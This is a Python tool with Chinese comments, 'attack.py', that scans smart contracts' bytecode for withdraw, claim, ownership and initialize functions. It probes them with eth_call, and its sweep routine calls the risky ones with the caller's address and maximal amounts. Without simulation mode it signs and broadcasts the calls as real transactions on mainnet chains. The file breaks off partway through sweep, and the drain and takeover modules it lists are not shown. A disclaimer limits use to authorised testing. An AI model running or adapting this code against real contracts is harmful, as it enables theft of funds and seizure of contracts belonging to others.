#!/usr/bin/env python3
"""
attack.py —— 合约攻击模拟一条龙工具
=========================================

⚠️  WARNING / 重要声明 ⚠️
本工具仅用于：
  • 自己合法控制的合约
  • 经书面授权的安全测试（白帽/渗透测试）
  • 教学研究目的（本地/测试网）
严禁用于攻击他人资产。违法使用后果自负。

功能模块：
  recon      —— 侦察：提取所有函数、危险等级、admin/owner 状态
  probe      —— 探针：批量 eth_call 试探每个函数是否可调通
  sweep      —— 枚举：对高危函数用常见参数组合发起 simulate 试探
  drain      —— 提取：对有余额的合约尝试调用 withdraw/claim 类函数
  takeover   —— 接管：检测并模拟 transferOwnership / initialize 未保护漏洞
  selector   —— 选择器碰撞：构造能撞上目标 selector 的恶意函数名
  replay     —— 重放：从历史交易提取 calldata 并重放
  decompile  —— 反编译：用 pyevmasm 反汇编 + panoramix 反编译字节码，提取函数与参数
  full       —— 一条龙：依次执行 recon→probe→sweep→drain→takeover

依赖：pip install web3 requests rich pyevmasm panoramix-decompiler
用法：
  python attack.py recon      0xTarget --rpc https://...
  python attack.py probe      0xTarget --rpc https://...
  python attack.py sweep      0xTarget --rpc https://... --key $PK --simulate
  python attack.py drain      0xTarget --rpc https://... --key $PK --to 0xMe
  python attack.py takeover   0xTarget --rpc https://...
  python attack.py selector   0xa9059cbb --target-name "initialize"
  python attack.py replay     0xTxHash --rpc https://... --key $PK --simulate
  python attack.py decompile  0xTarget --rpc https://... [--backend panoramix|evmasm|both]
  python attack.py full       0xTarget --rpc https://... --key $PK --simulate
"""

import argparse
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from web3 import Web3
from eth_utils import keccak, to_checksum_address
from eth_account import Account

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    console = Console()
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    class _C:
        def print(self, *a, **kw):
            txt = " ".join(str(x) for x in a)
            txt = re.sub(r"\[/?[a-z0-9 _#]+\]", "", txt)
            print(txt)
    console = _C()



# ==============================================================================
# 配置
# ==============================================================================
CHAINS = {
    "eth":     "https://eth.llamarpc.com",
    "arb":     "https://arb1.arbitrum.io/rpc",
    "op":      "https://mainnet.optimism.io",
    "base":    "https://mainnet.base.org",
    "bsc":     "https://bsc-dataseed.binance.org",
    "polygon": "https://polygon-rpc.com",
    "local":   "http://127.0.0.1:8545",
    "anvil":   "http://127.0.0.1:8545",
    "hardhat": "http://127.0.0.1:8545",
    "sepolia": "https://sepolia.gateway.tenderly.co",
}

EIP1967_IMPL_SLOT  = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
EIP1967_ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103

# 内置常用函数字典（selector → signature）
BUILTIN = {
    "0xa9059cbb": "transfer(address,uint256)",
    "0x23b872dd": "transferFrom(address,address,uint256)",
    "0x095ea7b3": "approve(address,uint256)",
    "0x70a08231": "balanceOf(address)",
    "0x18160ddd": "totalSupply()",
    "0x06fdde03": "name()",
    "0x95d89b41": "symbol()",
    "0x313ce567": "decimals()",
    "0x40c10f19": "mint(address,uint256)",
    "0x42966c68": "burn(uint256)",
    "0x8da5cb5b": "owner()",
    "0xf2fde38b": "transferOwnership(address)",
    "0x715018a6": "renounceOwnership()",
    "0xf851a440": "admin()",
    "0x8456cb59": "pause()", "0x3f4ba83a": "unpause()", "0x5c975abb": "paused()",
    "0x3ccfd60b": "withdraw()",
    "0x2e1a7d4d": "withdraw(uint256)",
    "0xf3fef3a3": "withdraw(address,uint256)",
    "0xdb2e21bc": "emergencyWithdraw()",
    "0x4e71d92d": "claim()",
    "0x372500ab": "claimRewards()",
    "0xb88a802f": "claimReward()",
    "0x4641257d": "harvest()",
    "0x3d18b912": "getReward()",
    "0x3659cfe6": "upgradeTo(address)",
    "0x4f1ef286": "upgradeToAndCall(address,bytes)",
    "0x5c60da1b": "implementation()",
    "0x8129fc1c": "initialize()",
    "0xc4d66de8": "initialize(address)",
    "0x91d14854": "hasRole(bytes32,address)",
    "0x2f2ff15d": "grantRole(bytes32,address)",
    "0xd547741f": "revokeRole(bytes32,address)",
    "0xfc0c546a": "token()",
    "0x9d76ea58": "factory()",
    "0xdd62ed3e": "allowance(address,address)",
}

# 高危目标函数
HIGH_VALUE_SIGS = [
    "withdraw()", "withdraw(uint256)", "withdraw(address,uint256)",
    "emergencyWithdraw()", "claim()", "claimRewards()", "claimReward()",
    "harvest()", "getReward()", "rescueTokens(address,uint256)",
    "rescueETH()", "sweep(address)", "sweepTokens(address,uint256)",
    "drain()", "transferOwnership(address)", "setOwner(address)",
    "setAdmin(address)", "initialize()", "initialize(address)", "upgradeTo(address)",
]



# ==============================================================================
# 工具函数
# ==============================================================================
def get_w3(rpc=None, chain=None):
    if rpc:
        url = rpc
    elif chain:
        url = CHAINS.get(chain.lower(), rpc)
    else:
        url = os.getenv("RPC_URL", CHAINS["arb"])
    w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 30}))
    if not w3.is_connected():
        console.print(f"[red]❌ RPC 连接失败: {url}[/red]" if HAS_RICH else f"❌ RPC 失败: {url}")
        sys.exit(1)
    return w3, url


def load_account(args):
    key = getattr(args, "key", None) or os.getenv("PRIVATE_KEY")
    if key:
        if not key.startswith("0x"):
            key = "0x" + key
        return Account.from_key(key)
    return None


def sel4(sig):
    """计算函数选择器"""
    sig = re.sub(r"\s+", "", sig)
    return "0x" + keccak(text=sig)[:4].hex()


def lookup_sig(selector):
    """反查函数签名：先查内置字典，再查 openchain.xyz"""
    if selector in BUILTIN:
        return [BUILTIN[selector]]
    sigs = []
    try:
        r = requests.get(
            f"https://api.openchain.xyz/signature-database/v1/lookup?function={selector}",
            timeout=4)
        if r.status_code == 200:
            for x in r.json().get("result", {}).get("function", {}).get(selector, [])[:3]:
                sigs.append(x.get("name", ""))
    except Exception:
        pass
    return [s for s in sigs if s]


def extract_selectors(bytecode):
    """从字节码提取所有函数选择器（扫描 PUSH4 + dispatcher 正则）"""
    bc = bytes(bytecode)
    sels, disp = set(), set()
    i = 0
    while i < len(bc):
        op = bc[i]
        if op == 0x63 and i + 4 < len(bc):
            sel = bc[i+1:i+5]
            if sel not in (b'\x00'*4, b'\xff'*4) and sel != b'\x08\xc3\x79\xa0':
                sels.add("0x" + sel.hex())
            i += 5
        elif 0x60 <= op <= 0x7f:
            i += (op - 0x5f) + 1
        else:
            i += 1
    for pat in (rb'\x80\x63(.{4})\x14\x61.{2}\x57', rb'\x80\x63(.{4})\x14\x62.{3}\x57'):
        for m in re.finditer(pat, bc, re.DOTALL):
            disp.add("0x" + m.group(1).hex())
    return sels, disp


def eth_call(w3, to, data, sender=None, value=0):
    tx = {"to": to_checksum_address(to), "data": data, "value": value}
    if sender:
        tx["from"] = to_checksum_address(sender)
    return w3.eth.call(tx)


def build_and_send(w3, account, to, calldata, value=0, simulate=True, gas_limit=None):
    """构造、模拟 + 发送交易"""
    to_cs = to_checksum_address(to)
    try:
        result = eth_call(w3, to_cs, calldata, sender=account.address, value=value)
        console.print(f"  ✅ [green]模拟成功[/green]，返回 {len(result)} 字节")
    except Exception as e:
        console.print(f"  ❌ [red]模拟失败：{str(e)[:120]}[/red]")
        return None

    if simulate:
        console.print("  🛑 [yellow]--simulate 模式，不发链上交易[/yellow]")
        return None

    nonce = w3.eth.get_transaction_count(account.address, "pending")
    chain_id = w3.eth.chain_id
    gas = gas_limit or min(int(w3.eth.estimate_gas({
        "from": account.address, "to": to_cs, "data": calldata, "value": value
    }) * 1.3), 3_000_000)
    try:
        blk = w3.eth.get_block("latest")
        base_fee = blk.get("baseFeePerGas", 0)
        priority = w3.to_wei(1.5, "gwei")
        tx = {"from": account.address, "to": to_cs, "data": calldata, "value": value,
              "gas": gas, "nonce": nonce, "chainId": chain_id,
              "maxFeePerGas": base_fee * 2 + priority,
              "maxPriorityFeePerGas": priority, "type": 2}
    except Exception:
        tx = {"from": account.address, "to": to_cs, "data": calldata, "value": value,
              "gas": gas, "nonce": nonce, "chainId": chain_id,
              "gasPrice": w3.eth.gas_price, "type": 0}
    signed = account.sign_transaction(tx)
    raw = signed.rawTransaction if hasattr(signed, "rawTransaction") else signed.raw_transaction
    h = w3.eth.send_raw_transaction(raw)
    console.print(f"  📤 已发送: [cyan]{h.hex()}[/cyan]")
    rcpt = w3.eth.wait_for_transaction_receipt(h, timeout=120)
    if rcpt.status == 1:
        console.print(f"  ✅ [green]上链成功 block #{rcpt.blockNumber}[/green]")
    else:
        console.print(f"  ❌ [red]交易 revert[/red]")
    return rcpt



# ==============================================================================
# 新增模块：decompile —— 字节码反编译（pyevmasm 反汇编 + panoramix 高层反编译）
# ==============================================================================

def _try_import_pyevmasm():
    try:
        import pyevmasm
        return pyevmasm
    except ImportError:
        return None


def _try_import_panoramix():
    try:
        from panoramix.decompiler import decompile_bytecode
        return decompile_bytecode
    except ImportError:
        try:
            # 兼容旧版本入口
            from panoramix.main import main as _pm
            return None
        except ImportError:
            return None


def evmasm_disassemble(bytecode_hex: str) -> dict:
    """
    使用 pyevmasm 对字节码进行反汇编，并从中提取：
      - 所有 PUSH4 指令值（候选函数选择器）
      - dispatcher 跳转表中的选择器（DUP1 PUSH4 xx EQ PUSH2 JUMPI 模式）
      - 每个选择器对应的函数签名（经 openchain 反查）
      - 推断参数类型（利用 CALLDATALOAD 偏移规律）

    返回结构：
    {
      "selectors": [{"selector": "0x...", "signature": "...", "params": [...], "danger": "..."}],
      "disasm_preview": "前 60 条指令文本",
      "total_instructions": int,
    }
    """
    pyevmasm = _try_import_pyevmasm()
    if not pyevmasm:
        return {"error": "pyevmasm 未安装，请 pip install pyevmasm"}

    bc = bytes.fromhex(bytecode_hex.removeprefix("0x"))
    result = {"selectors": [], "disasm_preview": "", "total_instructions": 0}

    try:
        insns = list(pyevmasm.disassemble_all(bc))
    except Exception as e:
        result["error"] = f"反汇编失败: {e}"
        return result

    result["total_instructions"] = len(insns)

    # 生成前 60 条指令预览
    lines = []
    for ins in insns[:60]:
        op = ins.name
        operand = f" 0x{ins.operand:x}" if ins.operand is not None else ""
        lines.append(f"  {ins.pc:06x}  {op}{operand}")
    result["disasm_preview"] = "\n".join(lines)

    # ── 提取候选选择器 ──────────────────────────────────────────────
    push4_vals = set()
    dispatcher_sels = set()

    for idx, ins in enumerate(insns):
        # 所有 PUSH4
        if ins.name == "PUSH4" and ins.operand is not None:
            raw = ins.operand.to_bytes(4, "big")
            # 过滤全0、全F、revert selector
            if raw not in (b'\x00'*4, b'\xff'*4, b'\x08\xc3\x79\xa0'):
                push4_vals.add("0x" + raw.hex())

        # dispatcher 模式：DUP1 PUSH4 <sel> EQ PUSH2 JUMPI
        if (ins.name == "PUSH4" and ins.operand is not None
                and idx >= 1 and insns[idx - 1].name == "DUP1"
                and idx + 3 < len(insns)
                and insns[idx + 1].name == "EQ"
                and insns[idx + 2].name in ("PUSH1", "PUSH2", "PUSH3")
                and insns[idx + 3].name == "JUMPI"):
            raw = ins.operand.to_bytes(4, "big")
            dispatcher_sels.add("0x" + raw.hex())

    # ── 推断参数类型（CALLDATALOAD 偏移分析） ───────────────────────
    # 思路：在每个 JUMPDEST 之后的若干指令里，统计 CALLDATALOAD 的偏移量
    # offset 4  → 第1个参数（跳过4字节 selector）
    # offset 36 → 第2个参数，offset 68 → 第3个参数，依此类推
    # 每个参数 slot 宽 32 字节；地址通常后跟 AND 0xffffffff...（20字节掩码）
    sel_param_hints: dict[str, list[str]] = {}

    # 建立 JUMPDEST pc → 指令索引的映射
    jumpdest_indices = [i for i, ins in enumerate(insns) if ins.name == "JUMPDEST"]

    for jd_idx in jumpdest_indices:
        # 收集该 JUMPDEST 后的指令（最多 80 条）
        window = insns[jd_idx: jd_idx + 80]
        offsets = []
        is_address_slot = {}   # offset → bool

        for k, ins in enumerate(window):
            if ins.name == "CALLDATALOAD" and ins.operand is None:
                # 找上一条 PUSH 作为 offset
                if k > 0 and window[k-1].name.startswith("PUSH"):
                    try:
                        off = window[k-1].operand
                        if isinstance(off, int) and off >= 4:
                            offsets.append(off)
                            # 检测后续是否有地址掩码（AND + PUSH20 掩码）
                            if (k + 2 < len(window)
                                    and window[k+1].name.startswith("PUSH")
                                    and window[k+2].name == "AND"):
                                mask_val = window[k+1].operand
                                if isinstance(mask_val, int) and mask_val == (1 << 160) - 1:
                                    is_address_slot[off] = True
                    except Exception:
                        pass

        if not offsets:
            continue

        # 映射 offset → 参数类型
        param_types = []
        for off in sorted(set(offsets)):
            if is_address_slot.get(off):
                param_types.append("address")
            else:
                param_types.append("uint256")

        # 尝试找到对应哪个选择器（该 JUMPDEST 应该被某个 dispatcher JUMPI 跳入）
        # 简单策略：往前找最近的 PUSH4（dispatcher 里的选择器）
        for back in range(jd_idx - 1, max(jd_idx - 10, -1), -1):
            if insns[back].name == "PUSH4" and insns[back].operand is not None:
                raw = insns[back].operand.to_bytes(4, "big")
                sel_hex = "0x" + raw.hex()
                if sel_hex in dispatcher_sels or sel_hex in push4_vals:
                    sel_param_hints[sel_hex] = param_types
                break

    # ── 汇总结果 ────────────────────────────────────────────────────
    all_sels = push4_vals | dispatcher_sels
    for sel_hex in sorted(all_sels):
        sigs = lookup_sig(sel_hex)
        sig = sigs[0] if sigs else None

        # 参数：优先用反查到的签名，其次用字节码推断
        if sig:
            params = _parse_arg_types(sig)
            param_source = "signature"
        elif sel_hex in sel_param_hints:
            params = sel_param_hints[sel_hex]
            param_source = "bytecode-inferred"
        else:
            params = []
            param_source = "unknown"

        danger = classify_danger(sig) if sig else "UNKNOWN"
        result["selectors"].append({
            "selector":     sel_hex,
            "signature":    sig,
            "params":       params,
            "param_source": param_source,
            "danger":       danger,
            "in_dispatcher": sel_hex in dispatcher_sels,
        })

    result["selectors"].sort(
        key=lambda x: {"RED":0,"ORANGE":1,"YELLOW":2,"GREEN":3,"UNKNOWN":4}.get(x["danger"], 5)
    )
    return result


def panoramix_decompile(bytecode_hex: str, timeout_sec: int = 60) -> dict:
    """
    使用 panoramix 对字节码进行高层反编译，返回：
      - functions: 反编译识别的函数列表（含名称、参数、伪代码）
      - raw_output: panoramix 原始输出文本（截断到 8000 字符）

    panoramix 会尝试还原函数名、参数类型、控制流伪代码。
    """
    decompile_fn = _try_import_panoramix()
    result = {"functions": [], "raw_output": "", "error": None}

    if decompile_fn is None:
        result["error"] = "panoramix 未安装或版本不兼容，请 pip install panoramix-decompiler"
        return result

    bc_hex = bytecode_hex.removeprefix("0x")

    import io, contextlib
    out_buf = io.StringIO()

    try:
        # panoramix 0.6.x API：decompile_bytecode(hex_str) → dict
        import signal

        def _timeout_handler(signum, frame):
            raise TimeoutError("panoramix 超时")

        old = signal.signal(signal.SIGALRM, _timeout_handler)
        signal.alarm(timeout_sec)
        try:
            with contextlib.redirect_stdout(out_buf):
                decompiled = decompile_fn(bc_hex)
        finally:
            signal.alarm(0)
            signal.signal(signal.SIGALRM, old)

        raw = out_buf.getvalue()
        result["raw_output"] = raw[:8000]

        # 解析 panoramix 返回结构（dict of functions）
        if isinstance(decompiled, dict):
            for fname, fdata in decompiled.items():
                if fname.startswith("_"):
                    continue
                entry = {
                    "name":   fname,
                    "inputs": [],
                    "body":   "",
                }
                if isinstance(fdata, dict):
                    entry["inputs"] = fdata.get("inputs", [])
                    body_lines = fdata.get("body", [])
                    if isinstance(body_lines, list):
                        entry["body"] = "\n".join(str(l) for l in body_lines[:30])
                    elif isinstance(body_lines, str):
                        entry["body"] = body_lines[:800]
                result["functions"].append(entry)

        # 如果 API 返回了纯文本（部分版本），从文本解析函数头
        if not result["functions"] and raw:
            for line in raw.splitlines():
                m = re.match(r"^\s*def\s+(\w+)\(([^)]*)\)", line)
                if m:
                    result["functions"].append({
                        "name":   m.group(1),
                        "inputs": [t.strip() for t in m.group(2).split(",") if t.strip()],
                        "body":   "",
                    })

    except TimeoutError:
        result["error"] = f"panoramix 反编译超时（>{timeout_sec}s），字节码可能过大"
    except Exception as e:
        result["error"] = f"panoramix 反编译异常: {e}"
        stdout_text = out_buf.getvalue()
        if stdout_text:
            result["raw_output"] = stdout_text[:8000]

    return result


def do_decompile(w3, target: str, backend: str = "both", timeout: int = 60):
    """
    decompile 子命令主函数：
      backend = "evmasm"   → 仅 pyevmasm 反汇编分析
      backend = "panoramix"→ 仅 panoramix 高层反编译
      backend = "both"     → 两者都运行（默认）

    输出：
      1. pyevmasm：反汇编预览、函数选择器表（含推断参数类型）
      2. panoramix：函数伪代码（含参数类型、控制流）
    """
    addr = to_checksum_address(target)
    code = w3.eth.get_code(addr)
    if not code:
        console.print(f"[red]❌ {addr} 不是合约（无字节码）[/red]" if HAS_RICH
                      else f"❌ {addr} 无字节码")
        return {}

    bc_hex = code.hex()
    console.print(f"\n[bold cyan]═══ 字节码反编译: {addr} ═══[/bold cyan]" if HAS_RICH
                  else f"\n=== 字节码反编译: {addr} ===")
    console.print(f"  字节码大小: {len(code):,} 字节  ({len(bc_hex)//2:,} bytes)")

    combined = {"address": addr, "bytecode_size": len(code)}

    # ── pyevmasm 反汇编 ─────────────────────────────────────────────
    if backend in ("evmasm", "both"):
        console.print("\n[bold yellow]📋 [pyevmasm] 反汇编分析[/bold yellow]" if HAS_RICH
                      else "\n[pyevmasm] 反汇编分析")
        asm_result = evmasm_disassemble(bc_hex)

        if asm_result.get("error"):
            console.print(f"  ⚠️  {asm_result['error']}")
        else:
            console.print(f"  指令总数: {asm_result['total_instructions']:,}")
            console.print(f"\n  [dim]── 前 60 条指令预览 ──[/dim]" if HAS_RICH
                          else "\n  -- 前 60 条指令预览 --")
            console.print(asm_result["disasm_preview"])

            sels = asm_result["selectors"]
            console.print(f"\n  [dim]── 提取到 {len(sels)} 个函数选择器 ──[/dim]" if HAS_RICH
                          else f"\n  -- 提取到 {len(sels)} 个函数选择器 --")

            if HAS_RICH:
                t = Table(box=box.SIMPLE, show_header=True)
                t.add_column("风险", width=4)
                t.add_column("选择器", width=12)
                t.add_column("函数签名")
                t.add_column("参数类型")
                t.add_column("参数来源", width=12)
                t.add_column("Dispatcher", width=5, justify="center")
                ICONS = {"RED":"🔴","ORANGE":"🟠","YELLOW":"🟡","GREEN":"🟢","UNKNOWN":"⚪"}
                COLORS = {"RED":"red","ORANGE":"yellow","YELLOW":"yellow","GREEN":"green","UNKNOWN":"white"}
                for f in sels:
                    c = COLORS.get(f["danger"], "white")
                    params_str = ", ".join(f["params"]) if f["params"] else "—"
                    src_color = "green" if f["param_source"] == "signature" \
                                else ("yellow" if f["param_source"] == "bytecode-inferred" else "grey50")
                    t.add_row(
                        f"[{c}]{ICONS.get(f['danger'],'?')}[/{c}]",
                        f"[{c}]{f['selector']}[/{c}]",
                        f["signature"] or "[grey50]【未知】[/grey50]",
                        f"[{src_color}]{params_str}[/{src_color}]",
                        f"[dim]{f['param_source']}[/dim]",
                        "✅" if f["in_dispatcher"] else "",
                    )
                console.print(t)
            else:
                for f in sels:
                    params_str = ", ".join(f["params"]) if f["params"] else "—"
                    print(f"  {f['selector']}  {f['signature'] or '【未知】'}"
                          f"  [{params_str}]  src={f['param_source']}")

        combined["evmasm"] = asm_result

    # ── panoramix 高层反编译 ────────────────────────────────────────
    if backend in ("panoramix", "both"):
        console.print("\n[bold magenta]🔬 [panoramix] 高层反编译[/bold magenta]" if HAS_RICH
                      else "\n[panoramix] 高层反编译")
        console.print(f"  ⏳ 反编译中（最长 {timeout}s）...")
        pano_result = panoramix_decompile(bc_hex, timeout_sec=timeout)

        if pano_result.get("error"):
            console.print(f"  ⚠️  {pano_result['error']}")
        else:
            funcs = pano_result["functions"]
            console.print(f"  识别到 {len(funcs)} 个函数")
            for fn in funcs:
                inputs_str = ", ".join(fn["inputs"]) if fn["inputs"] else "无参数"
                console.print(
                    f"\n  [bold green]def {fn['name']}({inputs_str})[/bold green]" if HAS_RICH
                    else f"\n  def {fn['name']}({inputs_str})"
                )
                if fn["body"]:
                    for line in fn["body"].splitlines()[:20]:
                        console.print(f"    {line}")

            if not funcs and pano_result["raw_output"]:
                console.print("\n  [dim]── panoramix 原始输出（截断）──[/dim]" if HAS_RICH
                              else "\n  -- panoramix 原始输出 --")
                for line in pano_result["raw_output"].splitlines()[:60]:
                    console.print(f"  {line}")

        combined["panoramix"] = pano_result

    console.print(f"\n[bold]✅ 反编译完成[/bold]" if HAS_RICH else "\n反编译完成")
    return combined



# ==============================================================================
# 模块 1：recon —— 侦察（增强：字节码有合约时自动调用 evmasm_disassemble）
# ==============================================================================
def do_recon(w3, target, verbose=True):
    """侦察：字节码 + 代理 + 所有函数 + admin/owner 状态 + evmasm 参数推断"""
    addr = to_checksum_address(target)
    result = {"address": addr, "functions": [], "proxy": {}, "state": {}, "balance": 0}

    code = w3.eth.get_code(addr)
    if not code:
        console.print(f"[red]❌ {addr} 不是合约[/red]")
        return result
    result["bytecode_size"] = len(code)

    bal = w3.eth.get_balance(addr)
    result["balance_eth"] = float(w3.from_wei(bal, "ether"))

    # 代理检测
    impl_raw = w3.eth.get_storage_at(addr, EIP1967_IMPL_SLOT)
    impl = "0x" + impl_raw.hex()[-40:]
    if int(impl, 16):
        result["proxy"]["impl"] = to_checksum_address(impl)
    admin_raw = w3.eth.get_storage_at(addr, EIP1967_ADMIN_SLOT)
    adm = "0x" + admin_raw.hex()[-40:]
    if int(adm, 16):
        result["proxy"]["admin"] = to_checksum_address(adm)

    # 合并代理实现字节码
    all_bc = bytes(code)
    if result["proxy"].get("impl"):
        try:
            impl_code = w3.eth.get_code(to_checksum_address(result["proxy"]["impl"]))
            all_bc = bytes(code) + bytes(impl_code)
        except Exception:
            pass

    # 原始 PUSH4 扫描
    sels, disp = extract_selectors(all_bc)

    # ── 新增：用 pyevmasm 做更精准的参数推断 ──────────────────────
    evmasm_param_hints: dict[str, list[str]] = {}
    try:
        asm_r = evmasm_disassemble(all_bc.hex())
        for entry in asm_r.get("selectors", []):
            if entry.get("params") and entry.get("param_source") == "bytecode-inferred":
                evmasm_param_hints[entry["selector"]] = entry["params"]
    except Exception:
        pass

    # 反查 + 分类
    functions = []
    for sel in sorted(sels):
        sigs = lookup_sig(sel)
        sig = sigs[0] if sigs else None

        # 若签名未知但 evmasm 推断了参数，构造伪签名
        inferred_params = evmasm_param_hints.get(sel, [])
        if not sig and inferred_params:
            sig = f"unknown_{sel[2:6]}({','.join(inferred_params)})"
            source = "bytecode-inferred"
        else:
            source = "signature" if sig else "unknown"

        danger = classify_danger(sig) if sig else "UNKNOWN"
        functions.append({
            "selector":     sel,
            "signature":    sig,
            "params":       _parse_arg_types(sig) if sig else inferred_params,
            "param_source": source,
            "danger":       danger,
            "is_dispatcher": sel in disp,
        })

    result["functions"] = sorted(
        functions,
        key=lambda x: {"RED":0,"ORANGE":1,"YELLOW":2,"GREEN":3,"UNKNOWN":4}.get(x["danger"], 5)
    )

    # 关键状态读取
    state_probes = [
        ("admin",       "0xf851a440", "address"),
        ("owner",       "0x8da5cb5b", "address"),
        ("paused",      "0x5c975abb", "bool"),
        ("name",        "0x06fdde03", "string"),
        ("symbol",      "0x95d89b41", "string"),
        ("totalSupply", "0x18160ddd", "uint256"),
    ]
    for key, sel, ret_type in state_probes:
        try:
            raw = w3.eth.call({"to": addr, "data": sel})
            if not raw or len(raw) < 32:
                continue
            if ret_type == "address":
                v = "0x" + raw.hex()[-40:]
                if int(v, 16):
                    result["state"][key] = to_checksum_address(v)
            elif ret_type == "bool":
                result["state"][key] = bool(raw[-1])
            elif ret_type == "uint256":
                result["state"][key] = int.from_bytes(raw, "big")
            elif ret_type == "string" and len(raw) >= 96:
                n = int.from_bytes(raw[32:64], "big")
                if 0 < n <= 200:
                    result["state"][key] = raw[64:64+n].decode("utf-8", errors="replace")
        except Exception:
            pass

    if verbose:
        _print_recon(result)
    return result


def classify_danger(sig):
    if not sig:
        return "UNKNOWN"
    s = sig.lower()
    for kw in ["withdraw","drain","sweep","rescue","recover","emergency","selfdestruct",
               "kill","destroy","skim","collect","harvest","claim","redeem","exit"]:
        if kw in s:
            return "RED"
    for kw in ["transferownership","setowner","setadmin","grantrole","revokerole",
               "renounceownership","upgrade","initialize","setminter","setgovernance"]:
        if kw in s:
            return "ORANGE"
    for kw in ["mint","burn","pause","setfee","setrouter","blacklist","transfer","approve"]:
        if kw in s:
            return "YELLOW"
    for kw in ["owner","admin","balance","totalsupply","name","symbol","decimals","allowance"]:
        if kw in s:
            return "GREEN"
    return "UNKNOWN"


def _print_recon(r):
    ICONS = {"RED":"🔴","ORANGE":"🟠","YELLOW":"🟡","GREEN":"🟢","UNKNOWN":"⚪"}
    console.print(f"\n[bold cyan]═══ 侦察结果: {r['address']} ═══[/bold cyan]" if HAS_RICH
                  else f"\n=== 侦察结果: {r['address']} ===")
    console.print(f"  字节码: {r.get('bytecode_size',0):,} 字节  |  "
                  f"ETH余额: {r.get('balance_eth',0):.4f}")
    if r["proxy"].get("impl"):
        console.print(f"  🔗 代理合约  impl={r['proxy']['impl']}")
        if r["proxy"].get("admin"):
            console.print(f"     ProxyAdmin={r['proxy']['admin']}")

    for k, v in r.get("state", {}).items():
        console.print(f"  • {k:<14}= {v}")

    if not HAS_RICH:
        for f in r["functions"]:
            src = f.get("param_source", "")
            params = ", ".join(f.get("params", []))
            print(f"  {ICONS.get(f['danger'],'?')} {f['selector']}  "
                  f"{f['signature'] or '【未知】'}  [{params}]  ({src})")
        return

    t = Table(box=box.SIMPLE, show_header=True)
    t.add_column("风险", width=4)
    t.add_column("选择器", width=12)
    t.add_column("函数签名")
    t.add_column("参数类型")
    t.add_column("参数来源", width=14)
    t.add_column("Disp", width=4, justify="center")
    COLORS = {"RED":"red","ORANGE":"yellow","YELLOW":"yellow","GREEN":"green","UNKNOWN":"white"}
    for f in r["functions"][:40]:
        c = COLORS.get(f["danger"], "white")
        params_str = ", ".join(f.get("params", [])) or "—"
        src = f.get("param_source", "unknown")
        src_color = "green" if src == "signature" else ("yellow" if src == "bytecode-inferred" else "grey50")
        t.add_row(
            f"[{c}]{ICONS.get(f['danger'],'?')}[/{c}]",
            f"[{c}]{f['selector']}[/{c}]",
            f["signature"] or "[grey50]【未知】[/grey50]",
            f"[{src_color}]{params_str}[/{src_color}]",
            f"[dim]{src}[/dim]",
            "✅" if f["is_dispatcher"] else "",
        )
    console.print(t)



# ==============================================================================
# 模块 2：probe —— 批量 eth_call 探针
# ==============================================================================
def do_probe(w3, target, recon_result=None, sender=None):
    addr = to_checksum_address(target)
    if not recon_result:
        recon_result = do_recon(w3, target, verbose=False)

    console.print(f"\n[bold]🔍 探针扫描: {addr}[/bold]" if HAS_RICH
                  else f"\n探针扫描: {addr}")

    results = []
    for f in recon_result["functions"]:
        sel = f["selector"]
        sig = f["signature"]
        if not sig:
            continue
        arg_types = _parse_arg_types(sig)
        if arg_types:
            results.append({"selector": sel, "sig": sig, "status": "skip",
                            "reason": f"需要{len(arg_types)}个参数"})
            continue
        try:
            ret = w3.eth.call({"to": addr, "data": sel,
                               **({"from": to_checksum_address(sender)} if sender else {})})
            results.append({"selector": sel, "sig": sig, "status": "ok",
                            "return": ret.hex()[:64]})
            console.print(f"  ✅ {sel} [{sig}]  → 0x{ret.hex()[:32]}...")
        except Exception as e:
            msg = str(e)[:80]
            results.append({"selector": sel, "sig": sig, "status": "revert", "reason": msg})
            console.print(f"  ⚠️  {sel} [{sig}]  ← {msg}")

    ok = [r for r in results if r["status"] == "ok"]
    console.print(f"\n  结果: 可调通 {len(ok)}/{len(results)} 个函数")
    return results


def _parse_arg_types(sig):
    try:
        inside = sig[sig.index("(")+1:sig.rindex(")")]
        if not inside.strip():
            return []
        return [t.strip() for t in inside.split(",")]
    except Exception:
        return []


# ==============================================================================
# 模块 3：sweep —— 高危函数参数穷举模拟
# ==============================================================================
def do_sweep(w3, target, account, recon_result=None, simulate=True, to_addr=None):
    addr = to_checksum_address(target)
    if not recon_result:
        recon_result = do_recon(w3, target, verbose=False)

    attacker = account.address if account else None
    _to = to_checksum_address(to_addr) if to_addr else attacker

    def gen_args(arg_types):
        result = []
        for t in arg_types:
            t = t.strip()
            if t == "address":
                result.append(to_checksum_address(_to or "0x0000000000000000000000000000000000000001"))
            elif t.startswith("uint") or t.startswith("int"):
                result.append(2**256 - 1)
            elif t == "bytes" or t.startswith("bytes"):
                result.append(b"")
            elif t == "bool":
                result.append(True)
            else:
                result.append(b"")
        return result

    console.print(f"\n[bold red]⚔️  Sweep 模拟攻击: {addr}[/bold red]" if HAS_RICH
                  else f"\nSweep 攻击: {addr}")

    hit = []
    for f in recon_result["functions"]:
        if f["danger"] not in ("RED", "ORANGE"):
            continue
        sig = f["signature"]
        if not sig:
            continue
        sel_bytes = bytes.fromhex(f["selector"][2:])
        arg_types = _parse_arg_types(sig)
        args = gen_args(arg_types)
        try:
            from eth_abi import encode as abi_encode
            encoded = abi_encode(arg_types, args) if arg_types and args else b""
        except Exception:
            encoded = b""

        calldata = sel_bytes + encoded
        try:
            ret = w3.eth.call({
                "to": addr, "data": calldata,
                **({"from": to_checksum_address(attacker)} if attacker else {})
            })
            console.print(f"  💥 [green bold]可调通！[/green bold] {sig}" if HAS_RICH
                          else f"  !! 可调通: {sig}")
            hit.append({"sig": sig, "selector": f["selector"],
                        "calldata": "0x"+calldata.hex(), "return": ret.hex()})
            if not simulate and account:
                build_and_send(w3, account, addr, calldata, simulate=False)
        except Exception as e:
            msg = str(e)[:100]
            if "execution reverted" in msg.lower() or "revert" in msg.lower():
                console.print(f"  🔒 {sig} → revert（有权限检查）")
            else:
                console.print(f"  ❓ {sig} → {msg}")

    if hit:
        console.print(f"\n  🎯 [bold red]发现 {len(hit)} 个可利用函数！[/bold red]" if HAS_RICH
